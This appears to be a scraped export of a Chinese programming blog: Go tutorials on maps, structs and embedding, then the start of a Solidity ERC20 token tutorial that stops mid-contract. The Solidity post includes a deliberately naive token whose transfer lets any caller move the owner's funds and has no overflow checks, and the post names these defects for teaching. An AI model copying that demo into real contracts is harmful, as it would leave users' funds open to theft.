通过key作为索引下标来访问map将产生一个value。如果key在map中是存在的，那么将得到与key对应的value；如果key不存在，那么将得到value对应类型的零值，正如我们前面看到的ages[“bob”]那样。这个规则很实用，但是有时候可能需要知道对应的元素是否眞的是在map之中。例如，如果元素类型是一个数字，你可以需要区分一个已经存在的0，和不存在而返回零值的0，可以像下面这样测试： 12age, ok := ages[&quot;bob&quot;]if !ok &#123; /* &quot;bob&quot; is not a key in this map; age == 0. */ &#125; 你会经常看到将这两个结合起来使用，像这样： 1if age, ok := ages[&quot;bob&quot;]; !ok &#123; /* ... */ &#125; 在这种场景下，map的下标语法将产生两个值；第二个是一个布尔值，用于报告元素是否眞的存在。布尔变量一般命名为ok，特别适合马上用于if条件判断部分。 和slice一样，map之间也不能进行相等比较；唯一的例外是和nil进行比较。要判断两个map是否包含相同的key和value，我们必须通过一个循环实现： 1234567891011func equal(x, y map[string]int) bool &#123; if len(x) != len(y) &#123; return false &#125; for k, xv := range x &#123; if yv, ok := y[k]; !ok || yv != xv &#123; return false &#125; &#125; return true&#125; 要注意我们是如何用!ok来区分元素缺失和元素不同的。我们不能简单地用xv != y[k]判断，那样会导致在判断下面两个map时产生错误的结果： // True if equal is written incorrectly. equal(map[string]int{“A”: 0}, map[string]int{“B”: 42}) Go语言中并没有提供一个set类型，但是map中的key也是不相同的，可以用map实现类似set的功能。为了说明这一点，下面的dedup程序读取多行输入，但是只打印第一次出现的行。（它是1.3节中出现的dup程序的变体。）dedup程序通过map来表示所有的输入行所对应的set集合，以确保已经在集合存在的行不会被重复打印。 12345678910111213141516func main() &#123; seen := make(map[string]bool) // a set of strings input := bufio.NewScanner(os.Stdin) for input.Scan() &#123; line := input.Text() if !seen[line] &#123; seen[line] = true fmt.Println(line) &#125; &#125; if err := input.Err(); err != nil &#123; fmt.Fprintf(os.Stderr, \"dedup: %v\\n\", err) os.Exit(1) &#125;&#125; Go程序员将这种忽略value的map当作一个字符串集合，并非所有map[string]bool类型value都是无关紧要的；有一些则可能会同时包含tue和false的值。 有时候我们需要一个map或set的key是slice类型，但是map的key必须是可比较的类型，但是slice并不满足这个条件。不过，我们可以通过两个步骤绕过这个限制。第一步，定义一个辅助函数k，将slice转为map对应的string类型的key，确保只有x和y相等时k(x) == k(y)才成立。然后创建一个key为string类型的map，在每次对map操作时先用k辅助函数将slice转化为string类型。 下面的例子演示了如何使用map来记录提交相同的字符串列表的次数。它使用了fmt.Sprintf函数将字符串列表转换为一个字符串以用于map的key，通过%q参数忠实地记录每个字符串元素的信息 var m = make(map[string]int) func k(list []string) string { return fmt.Sprintf(&quot;%q&quot;, list) } func Add(list []string) { m[k(list)]++ } func Count(list []string) int { return m[k(list)] } 使用同样的技术可以处理任何不可比较的key类型，而不仅仅是slice类型。这种技术对于想使用自定义key比较函数的时候也很有用，例如在比较字符串的时候忽略大小写。同时，辅助函数k(x)也不一定是字符串类型，它可以返回任何可比较的类型，例如整数、数组或结构体等。 这是map的另一个例子，下面的程序用于统计输入中每个Unicode码点出现的次数。虽然Unicode全部码点的数量巨大，但是出现在特定文档中的字符种类并没有多少，使用map可以用比较自然的方式来跟踪那些出现过字符的次数。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// Charcount computes counts of Unicode characters.package mainimport ( \"bufio\" \"fmt\" \"io\" \"os\" \"unicode\" \"unicode/utf8\")func main() &#123; counts := make(map[rune]int) // counts of Unicode characters var utflen [utf8.UTFMax + 1]int // count of lengths of UTF-8 encodings invalid := 0 // count of invalid UTF-8 characters in := bufio.NewReader(os.Stdin) for &#123; r, n, err := in.ReadRune() // returns rune, nbytes, error if err == io.EOF &#123; break &#125; if err != nil &#123; fmt.Fprintf(os.Stderr, \"charcount: %v\\n\", err) os.Exit(1) &#125; if r == unicode.ReplacementChar &amp;&amp; n == 1 &#123; invalid++ continue &#125; counts[r]++ utflen[n]++ &#125; fmt.Printf(\"rune\\tcount\\n\") for c, n := range counts &#123; fmt.Printf(\"%q\\t%d\\n\", c, n) &#125; fmt.Print(\"\\nlen\\tcount\\n\") for i, n := range utflen &#123; if i &gt; 0 &#123; fmt.Printf(\"%d\\t%d\\n\", i, n) &#125; &#125; if invalid &gt; 0 &#123; fmt.Printf(\"\\n%d invalid UTF-8 characters\\n\", invalid) &#125;&#125; ReadRune方法执行UTF-8解码并返回三个值：解码的rune字符的值，字符UTF-8编码后的长度，和一个错误值。我们可预期的错误值只有对应文件结尾的io.EOF。如果输入的是无效的UTF-8编码的字符，返回的将是unicode.ReplacementChar表示无效字符，并且编码长度是1。 charcount程序同时打印不同UTF-8编码长度的字符数目。对此，map并不是一个合适的数据结构；因为UTF-8编码的长度总是从1到utf8.UTFMax（最大是4个字节），使用数组将更有效。 作为一个实验，我们用charcount程序对英文版原稿的字符进行了统计。虽然大部分是英语，但是也有一些非ASCII字符。下面是排名前10的非ASCII字符： 下面是不同UTF-8编码长度的字符的数目： len count 1 765391 2 60 3 70 4 0 Map的value类型也可以是一个聚合类型，比如是一个map或slice。在下面的代码中，图graph的key类型是一个字符串，value类型map[string]bool代表一个字符串集合。从概念上将，graph将一个字符串类型的key映射到一组相关的字符串集合，它们指向新的graph的key。 1234567891011121314var graph = make(map[string]map[string]bool)func addEdge(from, to string) &#123; edges := graph[from] if edges == nil &#123; edges = make(map[string]bool) graph[from] = edges &#125; edges[to] = true&#125;func hasEdge(from, to string) bool &#123; return graph[from][to]&#125; 其中addEdge函数惰性初始化map是一个惯用方式，也就是说在每个值首次作为key时才初始化。addEdge函数显示了如何让map的零值也能正常工作；卽使from到to的边不存在，graph[from][to]依然可以返回一个有意义的结果。","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"golang语言渐入佳境[16]-结构体拷贝","slug":"golang-16-struct-copy","date":"2018-11-26T08:11:09.000Z","updated":"2018-11-27T15:29:25.588Z","comments":true,"path":"2018/11/26/golang-16-struct-copy/","link":"","permalink":"https://dreamerjonson.com/2018/11/26/golang-16-struct-copy/","excerpt":"","text":"结构体拷贝 12345678910111213141516171819202122232425262728type Dog struct &#123; name string color string age int8 kind string&#125;func main() &#123; //1、struct是值类型，默认的复制就是深拷贝 d1 := Dog&#123;\"豆豆\", \"黑色\", 2, \"二哈\"&#125; fmt.Printf(\"d1: %T , %v , %p \\n\", d1, d1, &amp;d1) d2 := d1 //值拷贝 fmt.Printf(\"d2: %T , %v , %p \\n\", d2, d2, &amp;d2) d2.name = \"毛毛\" fmt.Println(\"d2修改后：\", d2) fmt.Println(\"d1：\", d1) fmt.Println(\"------------------\") //2、直接赋值指针地址 d3 := &amp;d1 fmt.Printf(\"d3: %T , %v , %p \\n\", d3, d3, d3) d3.name = \"球球\" d3.color = \"白色\" d3.kind = \"萨摩耶\" fmt.Println(\"d3修改后：\", d3) fmt.Println(\"d1：\", d1) fmt.Println(\"------------------\") 结构体作为函数参数 123456789101112131415161718192021222324252627282930313233343536373839404142package mainimport \"fmt\"type Flower struct &#123; name, color string&#125;func main() &#123; //1、结构体作为参数的用法 f1 := Flower&#123;\"玫瑰\", \"红\"&#125; fmt.Printf(\"f1: %T , %v , %p \\n\" , f1 , f1 , &amp;f1) fmt.Println(\"----------------------\") //将结构体对象作为参数 changeInfo1(f1) fmt.Printf(\"f1: %T , %v , %p \\n\" , f1 , f1 , &amp;f1) fmt.Println(\"----------------------\") // 将结构体指针作为参数 changeInfo2(&amp;f1) fmt.Printf(\"f1: %T , %v , %p \\n\" , f1 , f1 , &amp;f1) fmt.Println(\"----------------------\")&#125;//返回结构体对象func getFlower1() (f Flower)&#123; f = Flower&#123;\"牡丹\", \"白\"&#125; fmt.Printf(\"函数getFlower1内f: %T , %v , %p \\n\" , f , f , &amp;f) return&#125;//返回结构体指针func getFlower2() (f *Flower)&#123; //f = &amp;Flower&#123;\"芙蓉\", \"红\"&#125; temp := Flower&#123;\"芙蓉\", \"红\"&#125; fmt.Printf(\"函数getFlower2内temp: %T , %v , %p \\n\" , temp , temp , &amp;temp) f = &amp;temp fmt.Printf(\"函数getFlower2内f: %T , %v , %p , %p \\n\" , f , f , f , &amp;f) return&#125; 结构体作为函数返回值 12345678910111213141516171819202122232425262728293031323334353637383940package mainimport \"fmt\"type Flower struct &#123; name, color string&#125;func main() &#123; //2、结构体作为返回值的用法 //结构体对象作为返回值 f2 := getFlower1() f3 := getFlower1() fmt.Println(\"更改前\" , f2 , f3) f2.name = \"杏花\" fmt.Println(\"更改后\" , f2 , f3) //结构体指针作为返回值 f4 := getFlower2() f5 := getFlower2() fmt.Println(\"更改前\" , f4 , f5) f4.name = \"桃花\" fmt.Println(\"更改后\" , f4 , f5)&#125;//返回结构体对象func getFlower1() (f Flower)&#123; f = Flower&#123;\"牡丹\", \"白\"&#125; fmt.Printf(\"函数getFlower1内f: %T , %v , %p \\n\" , f , f , &amp;f) return&#125;//返回结构体指针func getFlower2() (f *Flower)&#123; //f = &amp;Flower&#123;\"芙蓉\", \"红\"&#125; temp := Flower&#123;\"芙蓉\", \"红\"&#125; fmt.Printf(\"函数getFlower2内temp: %T , %v , %p \\n\" , temp , temp , &amp;temp) f = &amp;temp fmt.Printf(\"函数getFlower2内f: %T , %v , %p , %p \\n\" , f , f , f , &amp;f) return&#125;","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"go语言渐入佳境[15]-struct声明与定义","slug":"golang-15-struct","date":"2018-11-26T07:53:32.000Z","updated":"2019-03-19T09:27:17.666Z","comments":true,"path":"2018/11/26/golang-15-struct/","link":"","permalink":"https://dreamerjonson.com/2018/11/26/golang-15-struct/","excerpt":"","text":"结构体的声明 123456//声明Teacher结构体type Teacher struct &#123; name string age int8 sex byte&#125; 结构体的定义 方式1 //1、var声明方式实例化结构体，初始化方式为：对象.属性=值 1234var t1 Teacher t1.name = &quot;jonson&quot; t1.age = 35 t1.sex = 1 方式2 变量简短声明格式实例化结构体，初始化方式为：对象.属性=值 1234t2 := Teacher&#123;&#125;t2.name = &quot;olaya&quot;t2.age = 30t2.sex = 1 方式3 3、变量简短声明格式实例化结构体，声明时初始化。初始化方式为：属性:值 。属性:值可以同行，也可以换行。（类似map的用法） 123456t3 := Teacher&#123; name: &quot;Josh&quot;, age: 28, sex: 1,&#125;t3 = Teacher&#123;name: &quot;Josh2&quot;, age: 27, sex: 1&#125; 方式4 变量简短声明格式实例化结构体，声明时初始化，不写属性名，按属性顺序只写属性值 1t4 := Teacher&#123;&quot;Ruby&quot;, 30, 0&#125; 方式5 创建指针类型的结构体 1234567t5 := new(Teacher)(*t5).name = \"Running\"(*t5).age = 31(*t5).sex = 0t5.name = \"Running2\"t5.age = 31t5.sex = 0 方式6 匿名结构体 123addr := struct &#123; province, city string&#125;&#123;\"陕西省\", \"西安市\"&#125; 完整代码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162package mainimport \"fmt\"//定义Teacher结构体type Teacher struct &#123; name string age int8 sex byte&#125;func main() &#123; //1、var声明方式实例化结构体，初始化方式为：对象.属性=值 var t1 Teacher fmt.Println(t1) fmt.Printf(\"t1:%T , %v , %q \\n\", t1, t1, t1) //if t1 == nil &#123; // fmt.Println() //&#125; t1.name = \"Steven\" t1.age = 35 t1.sex = 1 fmt.Println(t1) fmt.Println(\"-------------------\") //2、变量简短声明格式实例化结构体，初始化方式为：对象.属性=值 t2 := Teacher&#123;&#125; t2.name = \"David\" t2.age = 30 t2.sex = 1 fmt.Println(t2) fmt.Println(\"-------------------\") //3、变量简短声明格式实例化结构体，声明时初始化。初始化方式为：属性:值 。属性:值可以同行，也可以换行。（类似map的用法） t3 := Teacher&#123; name: \"Josh\", age: 28, sex: 1, &#125; t3 = Teacher&#123;name: \"Josh2\", age: 27, sex: 1&#125; fmt.Println(t3) fmt.Println(\"-------------------\") //4、变量简短声明格式实例化结构体，声明时初始化，不写属性名，按属性顺序只写属性值 t4 := Teacher&#123;\"Ruby\", 30, 0&#125; fmt.Println(t4) fmt.Println(\"-------------------\") //5、创建指针类型的结构体 t5 := new(Teacher) fmt.Printf(\"t5:%T , %v , %p \\n\", t5, t5, t5) //(*t5).name = \"Running\" //(*t5).age = 31 //(*t5).sex = 0 //语法简写形式——语法糖 t5.name = \"Running2\" t5.age = 31 t5.sex = 0 fmt.Println(t5) fmt.Println(\"-------------------\")&#125; 结构体匿名字段 123456789101112131415161718192021222324252627package mainimport \"fmt\"type User struct &#123; //name string //sex byte //age int8 //height float64 //weight float64 string byte int8 float64&#125;func main() &#123; // 实例化结构体 user:= User&#123;\"jonson\" , 'm' , 35 , 177.5&#125; fmt.Println(user) //如果想依次输出姓名、年龄、身高、性别 fmt.Printf(\"姓名：%s \\n\" , user.string) fmt.Printf(\"身高：%.2f \\n\" , user.float64) fmt.Printf(\"性别：%c \\n\" , user.byte) fmt.Printf(\"年龄：%d \\n\" , user.int8)&#125; 结构体 结构体是一种聚合的数据类型，是由零个或多个任意类型的值聚合成的实体。每个值称为结构体的成员。用结构体的经典案例处理公司的员工信息，每个员工信息包含一个唯一的员工编号、员工的名字、家庭住址、出生日期、工作岗位、薪资、上级领导等等。所有的这些信息都需要绑定到一个实体中，可以作为一个整体单元被复制，作为函数的参数或返回值，或者是被存储到数组中，等等。 下面两个语句声明了一个叫Employee的命名的结构体类型，并且声明了一个Employee类型的变量dilbert： type Employee struct { ID int Name string Address string DoB time.Time Position string Salary int ManagerID int } var dilbert Employee dilbert结构体变量的成员可以通过点操作符访问，比如dilbert.Name和dilbert.DoB。因为dilbert是一个变量，它所有的成员也同样是变量，我们可以直接对每个成员赋值： dilbert.Salary -= 5000 // demoted, for writing too few lines of code 或者是对成员取地址，然后通过指针访问： 12position := &amp;dilbert.Position*position = &quot;Senior &quot; + *position // promoted, for outsourcing to Elbonia 点操作符也可以和指向结构体的指针一起工作： 12var employeeOfTheMonth *Employee = &amp;dilbertemployeeOfTheMonth.Position += &quot; (proactive team player)&quot; 相当于下面语句 1(*employeeOfTheMonth).Position += &quot; (proactive team player)&quot; 1234567下面的EmployeeByID函数将根据给定的员工ID返回对应的员工信息结构体的指针。我们可以使用点操作符来访问它里面的成员：func EmployeeByID(id int) *Employee &#123; /* ... */ &#125;fmt.Println(EmployeeByID(dilbert.ManagerID).Position) // &quot;Pointy-haired boss&quot;id := dilbert.IDEmployeeByID(id).Salary = 0 // fired for... no real reason 后面的语句通过EmployeeByID返回的结构体指针更新了Employee结构体的成员。如果将EmployeeByID函数的返回值从*Employee指针类型改为Employee值类型，那么更新语句将不能编译通过，因为在赋值语句的左边并不确定是一个变量（译注：调用函数返回的是值，并不是一个可取地址的变量）。 通常一行对应一个结构体成员，成员的名字在前类型在后，不过如果相邻的成员类型如果相同的话可以被合并到一行，就像下面的Name和Address成员那样： 12345678type Employee struct &#123; ID int Name, Address string DoB time.Time Position string Salary int ManagerID int&#125; 结构体成员的输入顺序也有重要的意义。我们也可以将Position成员合并（因为也是字符串类型），或者是交换Name和Address出现的先后顺序，那样的话就是定义了不同的结构体类型。通常，我们只是将相关的成员写到一起。 如果结构体成员名字是以大写字母开头的，那么该成员就是导出的；这是Go语言导出规则决定的。一个结构体可能同时包含导出和未导出的成员。 结构体类型往往是冗长的，因为它的每个成员可能都会占一行。虽然我们每次都可以重写整个结构体成员，但是重复会令人厌烦。因此，完整的结构体写法通常只在类型声明语句的地方出现，就像Employee类型声明语句那样。 一个命名为S的结构体类型将不能再包含S类型的成员：因为一个聚合的值不能包含它自身。（该限制同样适应于数组。）但是S类型的结构体可以包含*S指针类型的成员，这可以让我们创建递归的数据结构，比如链表和树结构等。在下面的代码中，我们使用一个二叉树来实现一个插入排序： 12345678910111213141516171819202122232425262728293031323334353637383940type tree struct &#123; value int left, right *tree&#125;// Sort sorts values in place.func Sort(values []int) &#123; var root *tree for _, v := range values &#123; root = add(root, v) &#125; appendValues(values[:0], root)&#125;// appendValues appends the elements of t to values in order// and returns the resulting slice.func appendValues(values []int, t *tree) []int &#123; if t != nil &#123; values = appendValues(values, t.left) values = append(values, t.value) values = appendValues(values, t.right) &#125; return values&#125;func add(t *tree, value int) *tree &#123; if t == nil &#123; // Equivalent to return &amp;tree&#123;value: value&#125;. t = new(tree) t.value = value return t &#125; if value &lt; t.value &#123; t.left = add(t.left, value) &#125; else &#123; t.right = add(t.right, value) &#125; return t&#125; 结构体类型的零值是每个成员都对是零值。通常会将零值作为最合理的默认值。例如，对于bytes.Buffer类型，结构体初始值就是一个随时可用的空缓存，还有在第9章将会讲到的sync.Mutex的零值也是有效的未锁定状态。有时候这种零值可用的特性是自然获得的，但是也有些类型需要一些额外的工作。 如果结构体没有任何成员的话就是空结构体，写作struct{}。它的大小为0，也不包含任何信息，但是有时候依然是有价值的。有些Go语言程序员用map带模拟set数据结构时，用它来代替map中布尔类型的value，只是强调key的重要性，但是因为节约的空间有限，而且语法比较复杂，所有我们通常避免避免这样的用法。 123456seen := make(map[string]struct&#123;&#125;) // set of strings// ...if _, ok := seen[s]; !ok &#123; seen[s] = struct&#123;&#125;&#123;&#125; // ...first time seeing s...&#125; 结构体值也可以用结构体面值表示，结构体面值可以指定每个成员的值。 123type Point struct&#123; X, Y int &#125;p := Point&#123;1, 2&#125; 这里有两种形式的结构体面值语法，上面的是第一种写法，要求以结构体成员定义的顺序为每个结构体成员指定一个面值。它要求写代码和读代码的人要记住结构体的每个成员的类型和顺序，不过结构体成员有细微的调整就可能导致上述代码不能编译。因此，上述的语法一般只在定义结构体的包内部使用，或者是在较小的结构体中使用，这些结构体的成员排列比较规则，比如image.Point{x, y}或color.RGBA{ red, green, blue, alpha}。 其实更常用的是第二种写法，以成员名字和相应的值来初始化，可以包含部分或全部的成员 anim := gif.GIF{LoopCount: nframes} 在这种形式的结构体面值写法中，如果成员被忽略的话将默认用零值。因为，提供了成员的名字，所有成员出现的顺序并不重要。 两种不同形式的写法不能混合使用。而且，你不能企图在外部包中用第一种顺序赋值的技巧来偷偷地初始化结构体中未导出的成员。 1234567package ptype T struct&#123; a, b int &#125; // a and b are not exportedpackage qimport \"p\"var _ = p.T&#123;a: 1, b: 2&#125; // compile error: can't reference a, bvar _ = p.T&#123;1, 2&#125; // compile error: can't reference a, b 虽然上面最后一行代码的编译错误信息中并没有显式提到未导出的成员，但是这样企图隐式使用未导出成员的行为也是不允许的。 结构体可以作为函数的参数和返回值。例如，这个Scale函数将Point类型的值缩放后返回： func Scale(p Point, factor int) Point { return Point{p.X * factor, p.Y * factor} } fmt.Println(Scale(Point{1, 2}, 5)) // “{5 10}” 如果考虑效率的话，较大的结构体通常会用指针的方式传入和返回， 123func Bonus(e *Employee, percent int) int &#123; return e.Salary * percent / 100&#125; 如果要在函数内部修改结构体成员的话，用指针传入是必须的；因为在Go语言中，所有的函数参数都是值拷贝传入的，函数参数将不再是函数调用时的原始变量。 123func AwardAnnualRaise(e *Employee) &#123; e.Salary = e.Salary * 105 / 100&#125; 因为结构体通常通过指针处理，可以用下面的写法来创建并初始化一个结构体变量，并返回结构体的地址： pp := &amp;Point{1, 2} 它是下面的语句是等价的 12pp := new(Point)*pp = Point&#123;1, 2&#125; 不过&amp;Point{1, 2}写法可以直接在表达式中使用，比如一个函数调用。 结构体比较 如果结构体的全部成员都是可以比较的，那么结构体也是可以比较的，那样的话两个结构体将可以使用或!=运算符进行比较。相等比较运算符将比较两个结构体的每个成员，因此下面两个比较的表达式是等价的： 123456type Point struct&#123; X, Y int &#125;p := Point&#123;1, 2&#125;q := Point&#123;2, 1&#125;fmt.Println(p.X == q.X &amp;&amp; p.Y == q.Y) // &quot;false&quot;fmt.Println(p == q) // &quot;false&quot; 可比较的结构体类型和其他可比较的类型一样，可以用于map的key类型。 1234567type address struct &#123; hostname string port int&#125;hits := make(map[address]int)hits[address&#123;&quot;golang.org&quot;, 443&#125;]++ 结构体嵌入和匿名成员 在本节中，我们将看到如何使用Go语言提供的不同寻常的结构体嵌入机制让一个命名的结构体包含另一个结构体类型的匿名成员，这样就可以通过简单的点运算符xf来访问匿名成员链中嵌套的xdef成员。 考虑一个二维的绘图程序，提供了一个各种图形的库，例如矩形、椭圆形、星形和轮形等几何形状。这里是其中两个的定义： 1234567type Circle struct &#123; X, Y, Radius int&#125;type Wheel struct &#123; X, Y, Radius, Spokes int&#125; 一个Circle代表的圆形类型包含了标准圆心的X和Y坐标信息，和一个Radius表示的半径信息。一个Wheel轮形除了包含Circle类型所有的全部成员外，还增加了Spokes表示径向辐条的数量。我们可以这样创建一个wheel变量： 12345var w Wheelw.X = 8w.Y = 8w.Radius = 5w.Spokes = 20 随着库中几何形状数量的增多，我们一定会注意到它们之间的相似和重复之处，所以我们可能为了便于维护而将相同的属性独立出来： 12345678910111213type Point struct &#123; X, Y int&#125;type Circle struct &#123; Center Point Radius int&#125;type Wheel struct &#123; Circle Circle Spokes int&#125; 这样改动之后结构体类型变的清晰了，但是这种修改同时也导致了访问每个成员变得繁琐： 12345var w Wheelw.Circle.Center.X = 8w.Circle.Center.Y = 8w.Circle.Radius = 5w.Spokes = 20 Go语言有一个特性让我们只声明一个成员对应的数据类型而不指名成员的名字；这类成员就叫匿名成员。匿名成员的数据类型必须是命名的类型或指向一个命名的类型的指针。下面的代码中，Circle和Wheel各自都有一个匿名成员。我们可以说Point类型被嵌入到了Circle结构体，同时Circle类型被嵌入到了Wheel结构体。 123456789type Circle struct &#123; Point Radius int&#125;type Wheel struct &#123; Circle Spokes int&#125; 得意于匿名嵌入的特性，我们可以直接访问叶子属性而不需要给出完整的路径： 12345var w Wheelw.X = 8 // equivalent to w.Circle.Point.X = 8w.Y = 8 // equivalent to w.Circle.Point.Y = 8w.Radius = 5 // equivalent to w.Circle.Radius = 5w.Spokes = 20 在右边的注释中给出的显式形式访问这些叶子成员的语法依然有效，因此匿名成员并不是眞的无法访问了。其中匿名成员Circle和Point都有自己的名字——就是命名的类型名字——但是这些名字在点操作符中是可选的。我们在访问子成员的时候可以忽略任何匿名成员部分。 不幸的是，结构体字面值并没有简短表示匿名成员的语法， 因此下面的语句都不能编译通过： 12w = Wheel&#123;8, 8, 5, 20&#125; // compile error: unknown fieldsw = Wheel&#123;X: 8, Y: 8, Radius: 5, Spokes: 20&#125; // compile error: unknown fields 结构体字面值必须遵循形状类型声明时的结构，所以我们只能用下面的两种语法，它们彼此是等价的： 12345678910111213141516171819w = Wheel&#123;Circle&#123;Point&#123;8, 8&#125;, 5&#125;, 20&#125;w = Wheel&#123; Circle: Circle&#123; Point: Point&#123;X: 8, Y: 8&#125;, Radius: 5, &#125;, Spokes: 20, // NOTE: trailing comma necessary here (and at Radius)&#125;fmt.Printf(\"%#v\\n\", w)// Output:// Wheel&#123;Circle:Circle&#123;Point:Point&#123;X:8, Y:8&#125;, Radius:5&#125;, Spokes:20&#125;w.X = 42fmt.Printf(\"%#v\\n\", w)// Output:// Wheel&#123;Circle:Circle&#123;Point:Point&#123;X:42, Y:8&#125;, Radius:5&#125;, Spokes:20&#125; 需要注意的是Printf函数中%v参数包含的#副词，它表示用和Go语言类似的语法打印值。对于结构体类型来说，将包含每个成员的名字。 因为匿名成员也有一个隐式的名字，因此不能同时包含两个类型相同的匿名成员，这会导致名字冲突。同时，因为成员的名字是由其类型隐式地决定的，所有匿名成员也有可见性的规则约束。在上面的例子中，Point和Circle匿名成员都是导出的。卽使它们不导出（比如改成小写字母开头的point和circle），我们依然可以用简短形式访问匿名成员嵌套的成员 w.X = 8 // equivalent to w.circle.point.X = 8 但是在包外部，因为circle和point没有导出不能访问它们的成员，因此简短的匿名成员访问语法也是禁止的。 到目前未知，我们看到匿名成员特性只是对访问嵌套成员的点运算符提供了简短的语法糖。稍后，我们将会看到匿名成员并不要求是结构体类型；其实任何命令的类型都可以作为结构体的匿名成员。但是为什么要嵌入一个没有任何子成员类型的匿名成员类型呢？ 答案是匿名类型的方法集。简短的点运算符语法可以用于选择匿名成员嵌套的成员，也可以用于访问它们的方法。实际上，外层的结构体不仅仅是获得了匿名成员类型的所有成员，而且也获得了该类型导出的全部的方法。这个机制可以用于将一个有简单行为的对象组合成有复杂行为的对象","categories":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/categories/go/"}],"tags":[{"name":"go","slug":"go","permalink":"https://dreamerjonson.com/tags/go/"}]},{"title":"solidity智能合约[55]-数字货币发行(上)","slug":"solidity-55-token","date":"2018-11-26T02:07:34.000Z","updated":"2018-12-01T14:00:06.385Z","comments":true,"path":"2018/11/26/solidity-55-token/","link":"","permalink":"https://dreamerjonson.com/2018/11/26/solidity-55-token/","excerpt":"","text":"数字货币 货币是用来交换、偿还债务的媒介。古代货币为金、银、贝壳等实物。现代中央银行发行的纸币等。相对于古代的一般等价物而言 现在的货币本质上是由政府信用的背书。其本身并没有价值。 同理、比特币与以太币本身并没有价值，但是依托于区块链网络的特性，使得其拥有货币的完美属性。包括： ·便携 ·耐用 ·可分割 ·可识别 ·可替代 ·稀缺且难以仿冒 数字货币引入 如下是一段简单的代币代码。balanceOf映射表存储金额。构造函数，定义了初始化发行与管理者。 transfer函数定义了转账操作。完成了货币存储与转移的功能。 本质上，此货币就是存储在balanceOf映射表中的数字。数字本身并没有价值，只有当你认为他有价值的时候，它才会有价值。所以，数字货币的背后，常常是对应与一定的商业价值。例如公司的股权等。 1234567891011121314151617pragma solidity ^0.4.23;contract tokenDemo&#123; mapping(address=&gt;uint) public balanceOf; address owner; constructor(uint initSupply) public &#123; balanceOf[msg.sender] = initSupply; owner = msg.sender; &#125; function transfer(address _to,uint _value) public &#123; balanceOf[owner] -= _value; balanceOf[_to] += _value; &#125;&#125; 一般代币合约的缺陷 如上面写好的简单代币demo，有三种缺陷。 1、没有权限的控制，任何人都可以调用transfer进行转账 2、没有防止溢出攻击 3、功能有限 4、没有统一的规范。 想象一下，如果每一个人或企业都写一个属于自己的代币合约。每一个合约都有自己的查询资金的函数名。都有自己的转账的函数名。那么每一次当我们需要用到其他人的代币，都需要查询，此代币合约中，每一个函数的功能。大大降低了效率。 这就为我们引出了ERC20代币。 ERC20协议 ERC是以太坊征求意见( Ethereum Request for Comment-20)的缩写. 20代表它的序号。其规范了代币合约，也就意味着，一旦合约满足了ERC20代币的规范，那么其必然有规范的函数标准。如下，就是ERC20代币协议规定的不同的函数及其功能。ERC20协议只是定义了函数的定义与功能，需要代币设计者自定义的实现函数功能。 1234567891011121314151617interface ERC20Interface &#123; //总发行数量 function totalSupply() external returns (uint); //查询数量 function balanceOf(address tokenOwner) external returns (uint balance); //查询授权数量 function allowance(address tokenOwner, address spender) external returns (uint remaining); //转账 function transfer(address to, uint tokens) external returns (bool success); //授权 function approve(address spender, uint tokens) external returns (bool success); //授权转账 function transferFrom(address from, address to, uint tokens) external returns (bool success); event Transfer(address indexed from, address indexed to, uint tokens); event Approval(address indexed tokenOwner, address indexed spender, uint tokens);&#125; ERC20代币实现 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198pragma solidity ^0.4.18;// ----------------------------------------------------------------------------// &apos;&apos; token contract//// 部署地址 :// 标志 : LOVE// 名字 : LOVE TOKEN// 总供应量 100000000000000000000000000// 精度 : 18// ---------------------------------------------------------------------------// ----------------------------------------------------------------------------// SafeMath安全库// ----------------------------------------------------------------------------contract SafeMath &#123; function safeAdd(uint a, uint b) public pure returns (uint c) &#123; c = a + b; require(c &gt;= a); &#125; function safeSub(uint a, uint b) public pure returns (uint c) &#123; require(b &lt;= a); c = a - b; &#125; function safeMul(uint a, uint b) public pure returns (uint c) &#123; c = a * b; require(a == 0 || c / a == b); &#125; function safeDiv(uint a, uint b) public pure returns (uint c) &#123; require(b &gt; 0); c = a / b; &#125;&#125;// ----------------------------------------------------------------------------// ERC20 代币标准// https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20-token-standard.md// ----------------------------------------------------------------------------contract ERC20Interface &#123; //总发行数量 function totalSupply() public constant returns (uint); //查询数量 function balanceOf(address tokenOwner) public constant returns (uint balance); //查询授权数量 function allowance(address tokenOwner, address spender) public constant returns (uint remaining); //转账 function transfer(address to, uint tokens) public returns (bool success); //授权 function approve(address spender, uint tokens) public returns (bool success); //授权转账 function transferFrom(address from, address to, uint tokens) public returns (bool success); event Transfer(address indexed from, address indexed to, uint tokens); event Approval(address indexed tokenOwner, address indexed spender, uint tokens);&#125;// ----------------------------------------------------------------------------// 所有者合约// ----------------------------------------------------------------------------contract Owned &#123; address public owner; address public newOwner; event OwnershipTransferred(address indexed _from, address indexed _to); function Owned() public &#123; owner = msg.sender; &#125; modifier onlyOwner &#123; require(msg.sender == owner); _; &#125; function transferOwnership(address _newOwner) public onlyOwner &#123; newOwner = _newOwner; &#125; function acceptOwnership() public &#123; require(msg.sender == newOwner); OwnershipTransferred(owner, newOwner); owner = newOwner; newOwner = address(0); &#125;&#125;// ----------------------------------------------------------------------------// ERC20代币，增加标志、名字、精度// 代币转移// ----------------------------------------------------------------------------contract LOVEToken is ERC20Interface, Owned, SafeMath &#123; string public symbol; string public name; uint8 public decimals; uint public _totalSupply; mapping(address =&gt; uint) balances; mapping(address =&gt; mapping(address =&gt; uint)) allowed; // ------------------------------------------------------------------------ // 构造函数 // ------------------------------------------------------------------------ function LOVEToken() public &#123; symbol = &quot;LOVER&quot;; name = &quot;LOVER Token&quot;; decimals = 18; _totalSupply = 100000000000000000000000000; 